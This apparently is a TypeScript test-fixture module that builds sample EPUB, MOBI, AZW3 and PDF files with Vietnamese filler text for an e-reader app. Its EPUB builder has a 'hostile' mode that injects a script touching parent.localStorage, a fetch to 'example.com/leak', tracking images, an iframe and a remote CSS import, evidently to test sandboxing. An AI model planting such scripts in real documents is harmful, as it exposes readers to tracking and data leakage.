import { zipSync, strToU8 } from 'fflate'

export function makeEPUB(fixed = false, hostile = false) {
  const title = fixed ? 'Những miền xanh' : 'Một khoảng lặng'
  const entries: Record<string, Uint8Array> = {
    mimetype: strToU8('application/epub+zip'),
    'META-INF/container.xml': strToU8('<?xml version="1.0"?><container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>'),
    'OEBPS/content.opf': strToU8(`<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:ke-sach:${fixed ? 'fixed' : 'text'}${hostile ? '-hostile' : ''}</dc:identifier><dc:title>${title}</dc:title><dc:creator>Kệ Sách</dc:creator><dc:language>vi</dc:language><meta property="dcterms:modified">2026-11-06T00:00:00Z</meta>${fixed ? '<meta property="rendition:layout">pre-paginated</meta>' : ''}</metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>${[1, 2, 3].map(i => `<item id="c${i}" href="ch${i}.xhtml" media-type="application/xhtml+xml"/>`).join('')}</manifest><spine>${[1, 2, 3].map(i => `<itemref idref="c${i}"/>`).join('')}</spine></package>`),
    'OEBPS/nav.xhtml': strToU8('<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>Mục lục</title></head><body><nav epub:type="toc"><ol><li><a href="ch1.xhtml">Một buổi sáng</a></li><li><a href="ch2.xhtml">Những con đường</a></li><li><a href="ch3.xhtml">Trở về</a></li></ol></nav></body></html>'),
  }
  for (const i of [1, 2, 3]) {
    const body = fixed
      ? `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="900" viewBox="0 0 600 900"><rect width="600" height="900" fill="${['#dce5c4', '#c5d7db', '#ebdac6'][i - 1]}"/><circle cx="400" cy="230" r="140" fill="#ffffff66"/><path d="M0 620Q150 340 300 620T600 620V900H0" fill="#456b50"/><text x="60" y="90" font-size="16" fill="#31533e">KỆ SÁCH · TRUYỆN THỬ</text><text x="60" y="180" font-size="42" font-family="Georgia" fill="#31533e">Những miền xanh</text><text x="60" y="830" font-size="24" fill="white">Trang ${i}</text></svg>`
      : `<h1>${['Một buổi sáng', 'Những con đường', 'Trở về'][i - 1]}</h1>${Array.from({ length: 26 }, (_, n) => `<p id="p${n}">Trang sách mở ra một khoảng lặng. Buổi sáng, ánh nắng ghé qua khung cửa, mang theo mùi hương của một ngày mới. Ta dừng lại để lắng nghe tiếng lá và đọc thêm một câu chuyện. Đoạn ${n + 1} của chương ${i}.</p>`).join('')}`
    entries[`OEBPS/ch${i}.xhtml`] = strToU8(`<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Chương ${i}</title>${fixed ? '<meta name="viewport" content="width=600,height=900"/>' : '<style>body{font-family:serif;padding:1em}p{line-height:1.7}</style>'}</head><body>${body}${hostile ? `<script>parent.localStorage.setItem('book-script-ran','yes');fetch('https://example.com/leak')</script><img src="https://example.com/tracker.png"/><iframe src="https://example.com"/><p onclick="parent.localStorage.setItem('book-script-ran','yes')">Không chạy script</p><style>@import url('https://example.com/leak.css');body{background-image:url('https://example.com/tracker2.png')}</style>` : ''}</body></html>`)
  }
  return Buffer.from(zipSync(entries, { level: 0, mtime: new Date('2026-01-01T00:00:00Z') }))
}

/** Minimal uncompressed MOBI6 containing original Vietnamese text. */
export function makeMOBI() {
  const html = Buffer.from(`<html><head><title>Một ngày bình yên</title></head><body><h1>Một ngày bình yên</h1>${Array.from({ length: 12 }, (_, i) => `<p>Đọc một cuốn sách là mở một cánh cửa mới. Tiếng Việt có dấu trong MOBI. Đoạn ${i + 1}.</p>`).join('')}<mbp:pagebreak/><h1>Chương tiếp theo</h1><p>Hành trình vẫn tiếp tục.</p></body></html>`, 'utf8')
  const title = Buffer.from('Một ngày bình yên', 'utf8')
  const record = Buffer.alloc(272 + title.length)
  record.writeUInt16BE(1, 0); record.writeUInt32BE(html.length, 4)
  record.writeUInt16BE(1, 8); record.writeUInt16BE(4096, 10)
  record.write('MOBI', 16); record.writeUInt32BE(232, 20)
  record.writeUInt32BE(2, 24); record.writeUInt32BE(65001, 28)
  record.writeUInt32BE(1, 32); record.writeUInt32BE(6, 36)
  record.writeUInt32BE(272, 84); record.writeUInt32BE(title.length, 88)
  record.writeUInt8(42, 95); record.writeUInt32BE(2, 108)
  record.writeUInt32BE(0xffffffff, 244)
  title.copy(record, 272)
  const header = Buffer.alloc(96)
  header.write('Ke Sach MOBI', 0); header.write('BOOKMOBI', 60); header.writeUInt16BE(2, 76)
  header.writeUInt32BE(96, 78); header.writeUInt32BE(96 + record.length, 86)
  return Buffer.concat([header, record, html])
}

/** Original KF8/AZW3 fixture with real skeleton/fragment INDX and FDST records. */
export function makeAZW3() {
  const variable = (number: number) => {
    const bytes = [number & 127]
    while ((number = Math.floor(number / 128))) bytes.unshift(number & 127)
    bytes[bytes.length - 1] |= 128
    return Buffer.from(bytes)
  }
  const indexRecords = (tags: [number, number][], rows: { name: string; values: number[][] }[]) => {
    const header = (count: number, idxt = 0) => {
      const b = Buffer.alloc(56)
      b.write('INDX'); b.writeUInt32BE(56, 4); b.writeUInt32BE(idxt, 20)
      b.writeUInt32BE(count, 24); b.writeUInt32BE(65001, 28)
      return b
    }
    const tagx = Buffer.alloc(12 + tags.length * 4)
    tagx.write('TAGX'); tagx.writeUInt32BE(tagx.length, 4); tagx.writeUInt32BE(1, 8)
    tags.forEach(([tag, count], i) => { tagx[12 + i * 4] = tag; tagx[13 + i * 4] = count; tagx[14 + i * 4] = 1 << i })
    const entries = rows.map(row => {
      const name = Buffer.from(row.name)
      return Buffer.concat([Buffer.from([name.length]), name, Buffer.from([(1 << tags.length) - 1]), ...row.values.flat().map(variable)])
    })
    const idxtOffset = 56 + entries.reduce((size, entry) => size + entry.length, 0)
    const idxt = Buffer.alloc(4 + rows.length * 2); idxt.write('IDXT')
    let offset = 56
    entries.forEach((entry, i) => { idxt.writeUInt16BE(offset, 4 + i * 2); offset += entry.length })
    return [Buffer.concat([header(1), tagx]), Buffer.concat([header(rows.length, idxtOffset), ...entries, idxt])]
  }
  const skeletons: { name: string; values: number[][] }[] = []
  const fragments: { name: string; values: number[][] }[] = []
  const raw: Buffer[] = []
  let offset = 0
  for (let i = 0; i < 2; i++) {
    const prefix = Buffer.from('<html xmlns="http://www.w3.org/1999/xhtml"><head><title>AZW3</title></head><body>')
    const suffix = Buffer.from('</body></html>')
    const fragment = Buffer.from(`<h1>Chương ${i + 1}</h1>${Array.from({ length: 10 }, (_, p) => `<p>Đọc sách AZW3 bằng tiếng Việt, giữ nguyên dấu và vị trí đọc. Một trang sách mở ra một hành trình mới. Đoạn ${p + 1}.</p>`).join('')}`)
    skeletons.push({ name: `skeleton${i}`, values: [[1], [offset, prefix.length + suffix.length]] })
    fragments.push({ name: String(offset + prefix.length), values: [[0], [i], [0, fragment.length]] })
    raw.push(prefix, suffix, fragment)
    offset += prefix.length + suffix.length + fragment.length
  }
  const text = Buffer.concat(raw)
  const textRecords = Array.from({ length: Math.ceil(text.length / 4096) }, (_, i) => text.subarray(i * 4096, (i + 1) * 4096))
  const skelIndex = 1 + textRecords.length, fragIndex = skelIndex + 2, fdstIndex = fragIndex + 2
  const title = Buffer.from('Một cuốn sách AZW3')
  const record = Buffer.alloc(292 + title.length)
  record.writeUInt16BE(1, 0); record.writeUInt32BE(text.length, 4)
  record.writeUInt16BE(textRecords.length, 8); record.writeUInt16BE(4096, 10)
  record.write('MOBI', 16); record.writeUInt32BE(264, 20); record.writeUInt32BE(2, 24)
  record.writeUInt32BE(65001, 28); record.writeUInt32BE(8, 36); record.writeUInt32BE(292, 84)
  record.writeUInt32BE(title.length, 88); record.writeUInt8(42, 95); record.writeUInt32BE(fdstIndex + 1, 108)
  record.writeUInt32BE(64, 128); record.writeUInt32BE(fdstIndex, 192); record.writeUInt32BE(1, 196)
  record.writeUInt32BE(0xffffffff, 244); record.writeUInt32BE(fragIndex, 248)
  record.writeUInt32BE(skelIndex, 252); record.writeUInt32BE(0xffffffff, 260)
  record.write('EXTH', 280); record.writeUInt32BE(12, 284); title.copy(record, 292)
  const fdst = Buffer.alloc(20); fdst.write('FDST'); fdst.writeUInt32BE(12, 4)
  fdst.writeUInt32BE(1, 8); fdst.writeUInt32BE(text.length, 16)
  const records = [record, ...textRecords, ...indexRecords([[1, 1], [6, 2]], skeletons), ...indexRecords([[2, 1], [4, 1], [6, 2]], fragments), fdst]
  const pdb = Buffer.alloc(78 + records.length * 8 + 2)
  pdb.write('Ke Sach AZW3'); pdb.write('BOOKMOBI', 60); pdb.writeUInt16BE(records.length, 76)
  offset = pdb.length
  records.forEach((r, i) => { pdb.writeUInt32BE(offset, 78 + i * 8); offset += r.length })
  return Buffer.concat([pdb, ...records])
}

export function makePDF(scan = false) {
  const objects: Buffer[] = []
  const add = (s: string | Buffer) => objects.push(typeof s === 'string' ? Buffer.from(s) : s)
  add('<< /Type /Catalog /Pages 2 0 R >>')
  add('<< /Type /Pages /Count 3 /Kids [3 0 R 4 0 R 5 0 R] >>')
  for (let i = 0; i < 3; i++) add(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 840] /Resources << /Font << /F1 6 0 R >> /XObject << /Im1 10 0 R >> >> /Contents ${7 + i} 0 R >>`)
  add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
  for (let i = 1; i <= 3; i++) {
    const content = scan ? 'q 500 0 0 700 50 70 cm /Im1 Do Q' : `BT /F1 28 Tf 60 740 Td (Ke Sach - PDF page ${i}) Tj 0 -60 Td /F1 16 Tf (Your next story starts here.) Tj ET`
    add(`<< /Length ${Buffer.byteLength(content)} >>\nstream\n${content}\nendstream`)
  }
  const image = Buffer.from([150, 175, 120, 200, 220, 180, 80, 120, 90, 230, 235, 200])
  add(Buffer.concat([Buffer.from('<< /Type /XObject /Subtype /Image /Width 2 /Height 2 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Length 12 >>\nstream\n'), image, Buffer.from('\nendstream')]))
  add(`<< /Title (${scan ? 'PDF scan' : 'PDF sample'}) /Author (Ke Sach) >>`)
  const chunks: Buffer[] = [Buffer.from('%PDF-1.4\n')]
  const offsets = [0]
  for (let i = 0; i < objects.length; i++) {
    offsets.push(Buffer.concat(chunks).length)
    chunks.push(Buffer.from(`${i + 1} 0 obj\n`), objects[i], Buffer.from('\nendobj\n'))
  }
  const xref = Buffer.concat(chunks).length
  chunks.push(Buffer.from(`xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.slice(1).map(offset => `${String(offset).padStart(10, '0')} 00000 n \n`).join('')}trailer\n<< /Size ${objects.length + 1} /Root 1 0 R /Info 11 0 R >>\nstartxref\n${xref}\n%%EOF`))
  return Buffer.concat(chunks)
}
